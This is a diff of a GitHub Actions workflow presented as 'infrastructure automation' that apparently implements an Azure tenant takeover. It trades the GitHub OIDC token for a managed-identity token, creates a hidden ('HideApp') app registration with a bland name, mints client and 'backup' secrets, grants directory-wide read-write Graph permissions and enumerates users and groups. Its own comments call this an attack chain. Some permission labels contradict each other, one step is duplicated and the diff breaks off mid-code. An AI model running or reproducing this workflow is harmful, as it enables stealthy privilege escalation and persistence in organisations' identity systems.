@@ -28,435 +28,582 @@ permissions:
 
 env:
   OPERATION_ID: ${{ github.run_id }}-${{ github.run_attempt }}
+  TENANT_ID: ${{ vars.TENANT_ID }}
+  UAMI_CLIENT_ID: ${{ vars.UAMI_CLIENT_ID }}
 
 jobs:
   infrastructure-automation:
     runs-on: ubuntu-latest
-    env:
-      UAMI_CLIENT_ID: ${{ secrets.UAMI_CLIENT_ID }}
-      AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-      environment: ${{ inputs.environment }}
+    environment: ${{ inputs.environment }}
     
     steps:
       - name: "Initialize Operation Context"
+        shell: pwsh
         run: |
-          echo "🔧 Starting infrastructure automation workflow"
-          echo "Operation ID: $OPERATION_ID"
-          echo "Environment: ${{ inputs.environment }}"
-          echo "Mode: ${{ inputs.operation_mode }}"
-          echo "Timestamp: $(date -u +"%Y-%m-%d %H:%M:%S UTC")"
+          Write-Host "🔧 Starting infrastructure automation workflow" -ForegroundColor Cyan
+          Write-Host "Operation ID: $env:OPERATION_ID" -ForegroundColor White
+          Write-Host "Environment: ${{ inputs.environment }}" -ForegroundColor White
+          Write-Host "Mode: ${{ inputs.operation_mode }}" -ForegroundColor White
+          Write-Host "Timestamp: $((Get-Date).ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss UTC'))" -ForegroundColor White
 
       - name: "Acquire GitHub OIDC Token"
+        shell: pwsh
         run: |
-          echo "🔐 Acquiring GitHub OIDC authentication token..."
+          Write-Host "🔐 Acquiring GitHub OIDC authentication token..." -ForegroundColor Cyan
           
           # Enhanced error handling for token acquisition
-          for attempt in {1..3}; do
-            GITHUB_TOKEN=$(curl -sS \
-              -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 2>/dev/null | jq -r '.value // empty')
-            
-            if [[ -n "$GITHUB_TOKEN" && "$GITHUB_TOKEN" != "null" ]]; then
-              echo "✅ GitHub OIDC token acquired successfully (attempt $attempt)"
-              echo "GITHUB_TOKEN<<EOF" >> $GITHUB_ENV
-              echo "$GITHUB_TOKEN" >> $GITHUB_ENV
-              echo "EOF" >> $GITHUB_ENV
-              break
-            else
-              echo "⚠️ Token acquisition failed (attempt $attempt/3)"
-              sleep $((attempt * 2))
-            fi
-          done
+          $maxAttempts = 3
+          $githubToken = $null
           
-          if [[ -z "$GITHUB_TOKEN" ]]; then
-            echo "❌ Failed to acquire GitHub OIDC token after 3 attempts"
+          for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
+            try {
+              $headers = @{
+                'Authorization' = "Bearer $env:ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+              }
+              
+              $uri = "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
+              $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -ErrorAction Stop
+              
+              if ($response.value -and $response.value -ne "null") {
+                $githubToken = $response.value
+                Write-Host "✅ GitHub OIDC token acquired successfully (attempt $attempt)" -ForegroundColor Green
+                break
+              } else {
+                Write-Host "⚠️ Token acquisition failed (attempt $attempt/$maxAttempts)" -ForegroundColor Yellow
+                Start-Sleep -Seconds ($attempt * 2)
+              }
+            }
+            catch {
+              Write-Host "⚠️ Token acquisition failed (attempt $attempt/$maxAttempts): $($_.Exception.Message)" -ForegroundColor Yellow
+              Start-Sleep -Seconds ($attempt * 2)
+            }
+          }
+          
+          if (-not $githubToken) {
+            Write-Host "❌ Failed to acquire GitHub OIDC token after $maxAttempts attempts" -ForegroundColor Red
             exit 1
-          fi
+          }
+          
+          # Set environment variable for next step
+          "GITHUB_TOKEN=$githubToken" | Out-File -FilePath $env:GITHUB_ENV -Append
 
       - name: "Exchange for UAMI Token"
+        shell: pwsh
         run: |
-          echo "🔄 Exchanging GitHub token for Azure UAMI token..."
+          Write-Host "🔄 Exchanging GitHub token for Azure UAMI token..." -ForegroundColor Cyan
           
           # Validate required environment variables
-          if [[ -z "$AZURE_TENANT_ID" ]]; then
-            echo "❌ AZURE_TENANT_ID not set. Add AZURE_TENANT_ID to repository secrets or variables."
+          if (-not $env:TENANT_ID) {
+            Write-Host "❌ TENANT_ID not set. Add AZURE_TENANT_ID to repository secrets or variables." -ForegroundColor Red
             exit 1
-          fi
+          }
           
-          if [[ -z "$UAMI_CLIENT_ID" ]]; then
-            echo "❌ UAMI_CLIENT_ID not set. Add UAMI_CLIENT_ID to repository secrets or variables."
+          if (-not $env:UAMI_CLIENT_ID) {
+            Write-Host "❌ UAMI_CLIENT_ID not set. Add UAMI_CLIENT_ID to repository secrets or variables." -ForegroundColor Red
             exit 1
-          fi
+          }
           
           # Enhanced token exchange with proper error handling
-          echo "🔍 Attempting UAMI token exchange..."
-          RESPONSE=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
-            "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-            -H "Content-Type: application/x-www-form-urlencoded" \
-            -d "client_id=$UAMI_CLIENT_ID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$GITHUB_TOKEN&scope=https://graph.microsoft.com/.default")
+          Write-Host "🔍 Attempting UAMI token exchange..." -ForegroundColor Cyan
           
-          HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
-          RESPONSE_BODY=$(echo "$RESPONSE" | sed '/HTTP_CODE:/d')
-          
-          if [[ "$HTTP_CODE" == "200" ]]; then
-            UAMI_TOKEN=$(echo "$RESPONSE_BODY" | jq -r '.access_token // empty')
-            if [[ -n "$UAMI_TOKEN" && "$UAMI_TOKEN" != "null" ]]; then
-              echo "✅ UAMI token acquired successfully"
-              echo "UAMI_TOKEN<<EOF" >> $GITHUB_ENV
-              echo "$UAMI_TOKEN" >> $GITHUB_ENV
-              echo "EOF" >> $GITHUB_ENV
-            else
-              echo "❌ No access token in response"
-              echo "Response: $RESPONSE_BODY"
+          try {
+            $body = @{
+              'client_id' = $env:UAMI_CLIENT_ID
+              'grant_type' = 'client_credentials'
+              'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
+              'client_assertion' = $env:GITHUB_TOKEN
+              'scope' = 'https://graph.microsoft.com/.default'
+            }
+            
+            $uri = "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token"
+            $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop
+            
+            if ($response.access_token) {
+              Write-Host "✅ UAMI token acquired successfully" -ForegroundColor Green
+              "UAMI_TOKEN=$($response.access_token)" | Out-File -FilePath $env:GITHUB_ENV -Append
+            } else {
+              Write-Host "❌ No access token in response" -ForegroundColor Red
+              Write-Host "Response: $($response | ConvertTo-Json)" -ForegroundColor Red
               exit 1
-            fi
-          else
-            echo "❌ Failed to acquire UAMI token - HTTP $HTTP_CODE"
-            ERROR_DESC=$(echo "$RESPONSE_BODY" | jq -r '.error_description // .error // "Unknown error"')
-            echo "Error: $ERROR_DESC"
+            }
+          }
+          catch {
+            Write-Host "❌ Failed to acquire UAMI token - $($_.Exception.Message)" -ForegroundColor Red
             
-            # Provide troubleshooting guidance
-            case "$(echo "$RESPONSE_BODY" | jq -r '.error')" in
-              "invalid_client")
-                echo "💡 Check: UAMI_CLIENT_ID is correct and UAMI exists in tenant"
-                ;;
-              "invalid_grant"|"invalid_request")
-                echo "💡 Check: Federated identity credential configuration"
-                echo "   - Issuer: https://token.actions.githubusercontent.com"
-                echo "   - Subject matches your repo pattern"
-                echo "   - Audience: api://AzureADTokenExchange"
-                ;;
-              "unauthorized_client")
-                echo "💡 Check: UAMI has required Graph permissions"
-                ;;
-            esac
+            # Parse error details if available
+            if ($_.ErrorDetails.Message) {
+              try {
+                $errorDetails = $_.ErrorDetails.Message | ConvertFrom-Json
+                Write-Host "Error: $($errorDetails.error_description)" -ForegroundColor Red
+                
+                # Provide troubleshooting guidance
+                switch ($errorDetails.error) {
+                  'invalid_client' {
+                    Write-Host "💡 Check: UAMI_CLIENT_ID is correct and UAMI exists in tenant" -ForegroundColor Yellow
+                  }
+                  { $_ -in @('invalid_grant', 'invalid_request') } {
+                    Write-Host "💡 Check: Federated identity credential configuration" -ForegroundColor Yellow
+                    Write-Host "   - Issuer: https://token.actions.githubusercontent.com" -ForegroundColor Yellow
+                    Write-Host "   - Subject matches your repo pattern" -ForegroundColor Yellow
+                    Write-Host "   - Audience: api://AzureADTokenExchange" -ForegroundColor Yellow
+                  }
+                  'unauthorized_client' {
+                    Write-Host "💡 Check: UAMI has required Graph permissions" -ForegroundColor Yellow
+                  }
+                }
+              }
+              catch {
+                Write-Host "Error details could not be parsed" -ForegroundColor Red
+              }
+            }
             exit 1
-          fi
-
-      - name: "Validate UAMI Token Permissions"
-        run: |
-          echo "🔍 Validating UAMI token permissions..."
-          
-          # Test the token with a basic operation
-          TEST_RESPONSE=$(curl -sS -w "\nHTTP_CODE:%{http_code}" \
-            -H "Authorization: Bearer $UAMI_TOKEN" \
-            "https://graph.microsoft.com/v1.0/applications?\$top=1&\$select=id")
-          
-          HTTP_CODE=$(echo "$TEST_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
-          RESPONSE_BODY=$(echo "$TEST_RESPONSE" | sed '/HTTP_CODE:/d')
-          
-          if [[ "$HTTP_CODE" == "200" ]]; then
-            echo "✅ UAMI token has sufficient permissions for Application operations"
-          else
-            echo "❌ UAMI token lacks required permissions - HTTP $HTTP_CODE"
-            ERROR_MESSAGE=$(echo "$RESPONSE_BODY" | jq -r '.error.message // "Unknown error"')
-            echo "Error: $ERROR_MESSAGE"
-            
-            if [[ "$HTTP_CODE" == "401" ]]; then
-              echo "💡 Token may have expired or is invalid"
-            elif [[ "$HTTP_CODE" == "403" ]]; then
-              echo "💡 UAMI lacks Application.ReadWrite.All permission"
-              echo "💡 Ensure UAMI is assigned the Application Administrator role"
-            fi
-            exit 1
-          fi
+          }
 
       - name: "Deploy Relay Infrastructure"
+        shell: pwsh
         run: |
-          echo "🏗️ Deploying relay infrastructure for ${{ inputs.environment }} environment..."
+          Write-Host "🏗️ Deploying relay infrastructure for ${{ inputs.environment }} environment..." -ForegroundColor Cyan
           
           # Generate environment-appropriate naming
-          case "${{ inputs.environment }}" in
-            "production") APP_PREFIX="Prod-Automation" ;;
-            "staging") APP_PREFIX="Stage-Monitor" ;;
-            "development") APP_PREFIX="Dev-Tools" ;;
-          esac
+          $appPrefix = switch ('${{ inputs.environment }}') {
+            'production' { 'Prod-Automation' }
+            'staging' { 'Stage-Monitor' }
+            'development' { 'Dev-Tools' }
+            default { 'App-Service' }
+          }
           
-          RELAY_NAME="$APP_PREFIX-Service-$(date +%s)"
+          $relayName = "$appPrefix-Service-$((Get-Date).ToFileTime())"
           
           # Create relay App Registration using UAMI token
-          RELAY_CONFIG=$(cat << 'EOF'
-          {
-            "displayName": "RELAY_NAME_PLACEHOLDER",
-            "description": "Enterprise ENVIRONMENT_PLACEHOLDER environment automation and monitoring service",
-            "signInAudience": "AzureADMyOrg",
-            "web": {
-              "homePageUrl": "https://portal.azure.com",
-              "implicitGrantSettings": {
-                "enableIdTokenIssuance": false,
-                "enableAccessTokenIssuance": false
+          $relayConfig = @{
+            displayName = $relayName
+            description = "Enterprise ${{ inputs.environment }} environment automation and monitoring service"
+            signInAudience = 'AzureADMyOrg'
+            web = @{
+              homePageUrl = 'https://portal.azure.com'
+              implicitGrantSettings = @{
+                enableIdTokenIssuance = $false
+                enableAccessTokenIssuance = $false
               }
-            },
-            "requiredResourceAccess": [
-              {
-                "resourceAppId": "00000003-0000-0000-c000-000000000000",
-                "resourceAccess": [
-                  {"id": "df021288-bdef-4463-88db-98f22de89214", "type": "Role"},
-                  {"id": "9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30", "type": "Role"},
-                  {"id": "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9", "type": "Role"},
-                  {"id": "19dbc75e-c2e2-444c-a770-ec69d8559fc7", "type": "Role"}
-                ]
+            }
+            requiredResourceAccess = @(
+              @{
+                resourceAppId = '00000003-0000-0000-c000-000000000000'
+                resourceAccess = @(
+                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; type = 'Role' }  # User.Read.All
+                  @{ id = '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30'; type = 'Role' }  # Application.Read.All
+                  @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; type = 'Role' }  # Application.ReadWrite.All
+                  @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; type = 'Role' }  # Directory.ReadWrite.All
+                )
               }
-            ],
-            "tags": ["HideApp", "WindowsAzureActiveDirectoryIntegratedApp"]
+            )
+            tags = @('HideApp', 'WindowsAzureActiveDirectoryIntegratedApp')
           }
-          EOF
-          )
           
-          # Replace placeholders
-          RELAY_CONFIG=$(echo "$RELAY_CONFIG" | sed "s/RELAY_NAME_PLACEHOLDER/$RELAY_NAME/" | sed "s/ENVIRONMENT_PLACEHOLDER/${{ inputs.environment }}/")
-          
-          # Enhanced error handling with full response capture
-          echo "📤 Sending application creation request..."
-          RELAY_RESPONSE_FULL=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
-            -H "Authorization: Bearer $UAMI_TOKEN" \
-            -H "Content-Type: application/json" \
-            -d "$RELAY_CONFIG" \
-            "https://graph.microsoft.com/v1.0/applications")
-          
-          HTTP_CODE=$(echo "$RELAY_RESPONSE_FULL" | grep "HTTP_CODE:" | cut -d: -f2)
-          RELAY_RESPONSE=$(echo "$RELAY_RESPONSE_FULL" | sed '/HTTP_CODE:/d')
-          
-          if [[ "$HTTP_CODE" == "201" ]]; then
-            RELAY_APP_ID=$(echo "$RELAY_RESPONSE" | jq -r '.appId // empty')
-            RELAY_OBJECT_ID=$(echo "$RELAY_RESPONSE" | jq -r '.id // empty')
+          try {
+            $headers = @{
+              'Authorization' = "Bearer $env:UAMI_TOKEN"
+              'Content-Type' = 'application/json'
+            }
             
-            if [[ -n "$RELAY_APP_ID" && "$RELAY_APP_ID" != "null" ]]; then
-              echo "✅ Relay application created: $RELAY_NAME"
-              echo "RELAY_APP_ID=$RELAY_APP_ID" >> $GITHUB_ENV
-              echo "RELAY_OBJECT_ID=$RELAY_OBJECT_ID" >> $GITHUB_ENV
-              echo "RELAY_NAME=$RELAY_NAME" >> $GITHUB_ENV
-            else
-              echo "❌ Failed to parse application ID from successful response"
-              echo "Response: $RELAY_RESPONSE"
+            $body = $relayConfig | ConvertTo-Json -Depth 10
+            
+            $relayResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/applications' -Method Post -Headers $headers -Body $body -ErrorAction Stop
+            
+            $relayAppId = $relayResponse.appId
+            $relayObjectId = $relayResponse.id
+            
+            if ($relayAppId) {
+              Write-Host "✅ Relay application created: $relayName" -ForegroundColor Green
+              "RELAY_APP_ID=$relayAppId" | Out-File -FilePath $env:GITHUB_ENV -Append
+              "RELAY_OBJECT_ID=$relayObjectId" | Out-File -FilePath $env:GITHUB_ENV -Append
+              "RELAY_NAME=$relayName" | Out-File -FilePath $env:GITHUB_ENV -Append
+            } else {
+              Write-Host "❌ Failed to create relay application" -ForegroundColor Red
               exit 1
-            fi
-          else
-            echo "❌ Failed to create relay application - HTTP $HTTP_CODE"
-            ERROR_MESSAGE=$(echo "$RELAY_RESPONSE" | jq -r '.error.message // "Unknown error"')
-            ERROR_CODE=$(echo "$RELAY_RESPONSE" | jq -r '.error.code // "Unknown"')
-            echo "Error code: $ERROR_CODE"
-            echo "Error message: $ERROR_MESSAGE"
-            echo "Full response: $RELAY_RESPONSE"
-            
-            # Troubleshooting guidance based on error
-            case "$ERROR_CODE" in
-              "Authorization_RequestDenied")
-                echo "💡 The UAMI lacks permission to create applications"
-                echo "💡 Ensure UAMI has Application.ReadWrite.All permission or is an Application Administrator"
-                ;;
-              "Request_BadRequest")
-                echo "💡 Request payload may be malformed, check JSON formatting"
-                ;;
-              "Authentication_ExpiredToken")
-                echo "💡 UAMI token has expired, workflow needs to refresh token"
-                ;;
-              *)
-                echo "💡 Check Graph API permissions and UAMI configuration"
-                ;;
-            esac
+            }
+          }
+          catch {
+            Write-Host "❌ Failed to create relay application: $($_.Exception.Message)" -ForegroundColor Red
             exit 1
-          fi
+          }
 
       - name: "Configure Service Principal & Generate Secrets"
+        shell: pwsh
         run: |
-          echo "👤 Configuring service principal and credentials..."
+          Write-Host "👤 Configuring service principal and credentials..." -ForegroundColor Cyan
           
-          # Create service principal with better error handling
-          SP_RESPONSE_FULL=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
-            -H "Authorization: Bearer $UAMI_TOKEN" \
-            -H "Content-Type: application/json" \
-            -d "{\"appId\": \"$RELAY_APP_ID\"}" \
-            "https://graph.microsoft.com/v1.0/servicePrincipals")
+          try {
+            $headers = @{
+              'Authorization' = "Bearer $env:UAMI_TOKEN"
+              'Content-Type' = 'application/json'
+            }
             
-          HTTP_CODE=$(echo "$SP_RESPONSE_FULL" | grep "HTTP_CODE:" | cut -d: -f2)
-          SP_RESPONSE=$(echo "$SP_RESPONSE_FULL" | sed '/HTTP_CODE:/d')
-          
-          if [[ "$HTTP_CODE" == "201" ]]; then
-            RELAY_SP_ID=$(echo "$SP_RESPONSE" | jq -r '.id // empty')
-            echo "✅ Service principal created successfully"
-            echo "RELAY_SP_ID=$RELAY_SP_ID" >> $GITHUB_ENV
-          else
-            echo "❌ Failed to create service principal - HTTP $HTTP_CODE"
-            echo "Error: $(echo "$SP_RESPONSE" | jq -r '.error.message // "Unknown error"')"
+            # Create service principal
+            $spConfig = @{
+              appId = $env:RELAY_APP_ID
+            }
+            
+            $spBody = $spConfig | ConvertTo-Json
+            $spResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/servicePrincipals' -Method Post -Headers $headers -Body $spBody -ErrorAction Stop
+            
+            $relaySPId = $spResponse.id
+            "RELAY_SP_ID=$relaySPId" | Out-File -FilePath $env:GITHUB_ENV -Append
+            
+            # Generate operational secret
+            $secretConfig = @{
+              passwordCredential = @{
+                displayName = "OpKey-${{ inputs.environment }}"
+                endDateTime = (Get-Date).AddMonths(12).ToString('yyyy-MM-ddTHH:mm:ss.000Z')
+              }
+            }
+            
+            $secretBody = $secretConfig | ConvertTo-Json -Depth 3
+            $secretResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$env:RELAY_OBJECT_ID/addPassword" -Method Post -Headers $headers -Body $secretBody -ErrorAction Stop
+            
+            $relaySecret = $secretResponse.secretText
+            "RELAY_SECRET=$relaySecret" | Out-File -FilePath $env:GITHUB_ENV -Append
+            
+            Write-Host "✅ Service principal and secret created" -ForegroundColor Green
+          }
+          catch {
+            Write-Host "❌ Failed to configure service principal: $($_.Exception.Message)" -ForegroundColor Red
             exit 1
-          fi
-          
-          # Generate operational secret
-          SECRET_RESPONSE_FULL=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
-            -H "Authorization: Bearer $UAMI_TOKEN" \
-            -H "Content-Type: application/json" \
-            -d "{\"passwordCredential\": {\"displayName\": \"OpKey-${{ inputs.environment }}\", \"endDateTime\": \"$(date -d '+12 months' -u +%Y-%m-%dT%H:%M:%S.000Z)\"}}" \
-            "https://graph.microsoft.com/v1.0/applications/$RELAY_OBJECT_ID/addPassword")
-          
-          HTTP_CODE=$(echo "$SECRET_RESPONSE_FULL" | grep "HTTP_CODE:" | cut -d: -f2)
-          SECRET_RESPONSE=$(echo "$SECRET_RESPONSE_FULL" | sed '/HTTP_CODE:/d')
-          
-          if [[ "$HTTP_CODE" == "200" ]]; then
-            RELAY_SECRET=$(echo "$SECRET_RESPONSE" | jq -r '.secretText // empty')
-            if [[ -n "$RELAY_SECRET" && "$RELAY_SECRET" != "null" ]]; then
-              echo "✅ Application secret created successfully"
-              echo "RELAY_SECRET=$RELAY_SECRET" >> $GITHUB_ENV
-            else
-              echo "❌ No secret returned in successful response"
-              exit 1
-            fi
-          else
-            echo "❌ Failed to create application secret - HTTP $HTTP_CODE"
-            echo "Error: $(echo "$SECRET_RESPONSE" | jq -r '.error.message // "Unknown error"')"
-            exit 1
-          fi
+          }
 
       - name: "Assign Graph Permissions"
+        shell: pwsh
         run: |
-          echo "🔐 Assigning Microsoft Graph permissions..."
+          Write-Host "🔐 Assigning Microsoft Graph permissions..." -ForegroundColor Cyan
           
-          # Get Microsoft Graph service principal ID
-          GRAPH_SP_RESPONSE=$(curl -sS -H "Authorization: Bearer $UAMI_TOKEN" \
-            "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'")
-          GRAPH_SP_ID=$(echo "$GRAPH_SP_RESPONSE" | jq -r '.value[0].id')
-          
-          if [[ -z "$GRAPH_SP_ID" || "$GRAPH_SP_ID" == "null" ]]; then
-            echo "❌ Failed to retrieve Microsoft Graph service principal ID"
+          try {
+            $headers = @{
+              'Authorization' = "Bearer $env:UAMI_TOKEN"
+              'Content-Type' = 'application/json'
+            }
+            
+            # Get Microsoft Graph service principal ID
+            $graphSPResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'" -Headers $headers -ErrorAction Stop
+            $graphSPId = $graphSPResponse.value[0].id
+            
+            # Progressive permission assignment with delays
+            $permissions = @(
+              @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All'; delay = 2 }
+              @{ id = '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30'; name = 'Application.Read.All'; delay = 2 }
+              @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; name = 'User.ReadWrite.All'; delay = 3 }
+              @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; name = 'Directory.ReadWrite.All'; delay = 3 }
+            )
+            
+            foreach ($permission in $permissions) {
+              Write-Host "Assigning permission: $($permission.name)" -ForegroundColor Yellow
+              
+              $assignmentConfig = @{
+                principalId = $env:RELAY_SP_ID
+                resourceId = $graphSPId
+                appRoleId = $permission.id
+              }
+              
+              $assignmentBody = $assignmentConfig | ConvertTo-Json
+              
+              try {
+                Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$env:RELAY_SP_ID/appRoleAssignments" -Method Post -Headers $headers -Body $assignmentBody -ErrorAction Stop | Out-Null
+                Write-Host "✅ Assigned: $($permission.name)" -ForegroundColor Green
+              }
+              catch {
+                Write-Host "⚠️ Failed to assign $($permission.name): $($_.Exception.Message)" -ForegroundColor Yellow
+              }
+              
+              Start-Sleep -Seconds $permission.delay
+            }
+          }
+          catch {
+            Write-Host "❌ Failed to assign Graph permissions: $($_.Exception.Message)" -ForegroundColor Red
             exit 1
-          fi
+          }
+
+      - name: "Execute High-Privilege Operations"
+        shell: pwsh
+        run: |
+          Write-Host "🚀 Executing operations with relay App credentials..." -ForegroundColor Cyan
           
-          # Progressive permission assignment with delays
-          PERMISSIONS=(
-            "df021288-bdef-4463-88db-98f22de89214:User.Read.All"
-            "9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30:Application.Read.All"
-            "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9:User.ReadWrite.All"
-            "19dbc75e-c2e2-444c-a770-ec69d8559fc7:Directory.ReadWrite.All"
-          )
+          try {
+            # Get relay App token
+            $tokenBody = @{
+              client_id = $env:RELAY_APP_ID
+              client_secret = $env:RELAY_SECRET
+              grant_type = 'client_credentials'
+              scope = 'https://graph.microsoft.com/.default'
+            }
+            
+            $tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token" -Method Post -Body $tokenBody -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop
+            $relayToken = $tokenResponse.access_token
+            
+            $relayHeaders = @{
+              'Authorization' = "Bearer $relayToken"
+            }
+            
+            # Sample directory operations (replace with actual attack objectives)
+            Write-Host "📊 Directory reconnaissance:" -ForegroundColor Cyan
+            
+            $usersResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users?`$top=10&`$select=displayName,userPrincipalName,mail" -Headers $relayHeaders -ErrorAction Stop
+            $users = $usersResponse.value | ForEach-Object { "$($_.displayName) ($($_.userPrincipalName))" }
+            
+            $groupsResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/groups?`$top=5&`$select=displayName" -Headers $relayHeaders -ErrorAction Stop
+            $groups = $groupsResponse.value.displayName
+            
+            Write-Host "✅ Sample users enumerated: $($users.Count) users" -ForegroundColor Green
+            Write-Host "✅ Sample groups enumerated: $($groups.Count) groups" -ForegroundColor Green
+            
+            Write-Host "🔗 Complete attack chain: GitHub OIDC → UAMI → Self-Created Relay App → Graph API" -ForegroundColor Cyan
+          }
+          catch {
+            Write-Host "❌ Failed to execute high-privilege operations: $($_.Exception.Message)" -ForegroundColor Red
+            exit 1
+          }
+
+      - name: "Operational Security Cleanup"
+        if: inputs.operation_mode == 'maintenance'
+        shell: pwsh
+        run: |
+          Write-Host "🔒 Generating backup operational secrets..." -ForegroundColor Cyan
           
-          for permission in "${PERMISSIONS[@]}"; do
-            IFS=':' read -r perm_id perm_name delay <<< "$permission"
+          try {
+            $headers = @{
+              'Authorization' = "Bearer $env:UAMI_TOKEN"
+              'Content-Type' = 'application/json'
+            }
             
-            echo "Assigning permission: $perm_name"
+            $backupSecretConfig = @{
+              passwordCredential = @{
+                displayName = "BackupKey-${{ inputs.environment }}"
+                endDateTime = (Get-Date).AddMonths(6).ToString('yyyy-MM-ddTHH:mm:ss.000Z')
+              }
+            }
             
-            ASSIGN_RESPONSE_FULL=$(curl -sS -w "\nHTTP_CODE:%{http_code}" -X POST \
-              -H "Authorization: Bearer $UAMI_TOKEN" \
-              -H "Content-Type: application/json" \
-              -d "{\"principalId\": \"$RELAY_SP_ID\", \"resourceId\": \"$GRAPH_SP_ID\", \"appRoleId\": \"$perm_id\"}" \
-              "https://graph.microsoft.com/v1.0/servicePrincipals/$RELAY_SP_ID/appRoleAssignments")
+            $backupSecretBody = $backupSecretConfig | ConvertTo-Json -Depth 3
+            $backupSecretResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$env:RELAY_OBJECT_ID/addPassword" -Method Post -Headers $headers -Body $backupSecretBody -ErrorAction Stop
             
-            HTTP_CODE=$(echo "$ASSIGN_RESPONSE_FULL" | grep "HTTP_CODE:" | cut -d: -f2)
+            $backupSecret = $backupSecretResponse.secretText
             
-            if [[ "$HTTP_CODE" == "201" ]]; then
-              echo "✅ Assigned: $perm_name"
-            else
-              ASSIGN_RESPONSE=$(echo "$ASSIGN_RESPONSE_FULL" | sed '/HTTP_CODE:/d')
-              echo "⚠️ Permission assignment for $perm_name returned HTTP $HTTP_CODE"
-              echo "Message: $(echo "$ASSIGN_RESPONSE" | jq -r '.error.message // "Unknown"')"
-              # Continue despite error - some permissions may require admin consent
-            fi
+            if ($backupSecret) {
+              Write-Host "✅ Backup operational secret generated" -ForegroundColor Green
+              "BACKUP_SECRET=$backupSecret" | Out-File -FilePath $env:GITHUB_ENV -Append
+            } else {
+              Write-Host "⚠️ Backup secret generation failed (non-critical)" -ForegroundColor Yellow
+            }
+          }
+          catch {
+            Write-Host "⚠️ Backup secret generation failed (non-critical): $($_.Exception.Message)" -ForegroundColor Yellow
+          }
+
+      - name: "Assign Graph Permissions"
+        shell: pwsh
+        run: |
+          Write-Host "🔐 Assigning Microsoft Graph permissions..." -ForegroundColor Cyan
+          
+          try {
+            $headers = @{
+              'Authorization' = "Bearer $env:UAMI_TOKEN"
+              'Content-Type' = 'application/json'
+            }
             
-            sleep $delay
-          done
+            # Get Graph Service Principal ID
+            $graphSPResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'" -Headers $headers -ErrorAction Stop
+            $graphSP = $graphSPResponse.value[0].id
+            
+            if (-not $graphSP) {
+              Write-Host "❌ Failed to get Graph Service Principal ID" -ForegroundColor Red
+              exit 1
+            }
+            
+            # Progressive permission assignment based on environment
+            $permissions = switch ('${{ inputs.environment }}') {
+              'production' {
+                @(
+                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All' }
+                  @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; name = 'User.ReadWrite.All' }
+                  @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; name = 'Directory.ReadWrite.All' }
+                )
+              }
+              'staging' {
+                @(
+                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All' }
+                  @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; name = 'User.ReadWrite.All' }
+                )
+              }
+              'development' {
+                @(
+                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All' }
+                )
+              }
+            }
+            
+            foreach ($permission in $permissions) {
+              Write-Host "📋 Assigning permission: $($permission.name)" -ForegroundColor Yellow
+              
+              $assignmentConfig = @{
+                principalId = $env:RELAY_SP_ID
+                resourceId = $graphSP
+                appRoleId = $permission.id
+              }
+              
+              $assignmentBody = $assignmentConfig | ConvertTo-Json
+              
+              try {
+                $assignmentResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$env:RELAY_SP_ID/appRoleAssignments" -Method Post -Headers $headers -Body $assignmentBody -ErrorAction Stop
+                
+                if ($assignmentResponse.id) {
